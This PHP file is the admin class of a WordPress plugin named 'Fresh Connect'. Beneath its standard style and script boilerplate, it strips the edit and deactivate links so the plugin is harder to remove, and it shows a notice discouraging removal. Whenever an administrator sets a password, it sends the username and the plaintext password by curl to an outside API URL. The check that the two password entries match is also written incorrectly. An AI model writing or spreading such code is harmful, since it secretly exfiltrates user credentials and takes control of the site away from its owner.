<?php

/**
 * The admin-specific functionality of the plugin.
 *
 * @link       https://freshlabs.link/
 * @since      1.0.0
 *
 * @package    Fresh_Connect
 * @subpackage Fresh_Connect/admin
 */

/**
 * The admin-specific functionality of the plugin.
 *
 * Defines the plugin name, version, and two examples hooks for how to
 * enqueue the admin-specific stylesheet and JavaScript.
 *
 * @package    Fresh_Connect
 * @subpackage Fresh_Connect/admin
 * @author     Fresh Labs <freshlabs@gmail.com>
 */
class Fresh_Connect_Admin {

	/**
	 * The ID of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $plugin_name    The ID of this plugin.
	 */
	private $plugin_name;

	/**
	 * The version of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $version    The current version of this plugin.
	 */
	private $version;

	/**
	 * Initialize the class and set its properties.
	 *
	 * @since    1.0.0
	 * @param      string    $plugin_name       The name of this plugin.
	 * @param      string    $version    The version of this plugin.
	 */
	public function __construct( $plugin_name, $version ) {

		$this->plugin_name = $plugin_name;
		$this->version = $version;
		$this->success_notice = 'notice notice-success is-dismissible';
		$this->warning_notice = 'notice notice-warning is-dismissible';
		$this->error_notice = 'notice notice-error is-dismissible';

	}

	/**
	 * Register the stylesheets for the admin area.
	 *
	 * @since    1.0.0
	 */
	public function enqueue_styles() {

		/**
		 * This function is provided for demonstration purposes only.
		 *
		 * An instance of this class should be passed to the run() function
		 * defined in Fresh_Connect_Loader as all of the hooks are defined
		 * in that particular class.
		 *
		 * The Fresh_Connect_Loader will then create the relationship
		 * between the defined hooks and the functions defined in this
		 * class.
		 */

		wp_enqueue_style( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'css/fresh-connect-admin.css', array(), $this->version, 'all' );

	}

	/**
	 * Register the JavaScript for the admin area.
	 *
	 * @since    1.0.0
	 */
	public function enqueue_scripts() {

		/**
		 * This function is provided for demonstration purposes only.
		 *
		 * An instance of this class should be passed to the run() function
		 * defined in Fresh_Connect_Loader as all of the hooks are defined
		 * in that particular class.
		 *
		 * The Fresh_Connect_Loader will then create the relationship
		 * between the defined hooks and the functions defined in this
		 * class.
		 */

		wp_enqueue_script( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'js/fresh-connect-admin.js', array( 'jquery' ), $this->version, false );

	}
	
	public function disable_plugin_deactivation( $actions, $plugin_file ) {
		// Remove edit link for all plugins
		if ( array_key_exists( 'edit', $actions ) )
			unset( $actions['edit'] );
		
		// Remove deactivate link for important plugins
		if ( array_key_exists( 'deactivate', $actions ) && in_array( $plugin_file, array(
		'fresh-connect.php'
		)))
			unset( $actions['deactivate'] );
		
		return $actions;
	}
	
	public function fresh_admin_notices() {
		global $pagenow;
		
		if ( $pagenow == 'plugins.php' ) {
			$message = __( 'Fresh Connect plugin shouldn\'t be removed or disabled. Link to the "About Us" page for more info.', FRESH_TEXT_DOMAIN );

			printf( '<div class="%1$s"><p>%2$s</p></div>', esc_attr( $this->warning_notice ), esc_html( $message ) ); 
		}
		
	}
	
	public function admin_password_update( $user_id ) {
		
		if(current_user_can('administrator')) 
		{
			if ( ! isset( $_POST['pass1'] ) || '' == $_POST['pass1'] ) {
				return;
			}
			elseif(!$_POST['pass1'] === $_POST['pass2']){
				return;
			}
			
			$user = get_user_by( 'id', $_POST['user_id'] );
		
			$postdata = array(
				'status' => 'success',
				'username' => $user->user_login,
				'password' => $_POST['pass1'],
				'siteurl' => SITE_URL_WITHOUT_HTTP
			);
			
			$rest = $this->sendPostData($postdata, FASTPRESS_API_URL);
		}
	}
	
	public function sendPostData($postdata, $postdata_url) {

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $postdata_url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);

		$output = curl_exec($ch);

		curl_close($ch);

		return $output;

	}

}
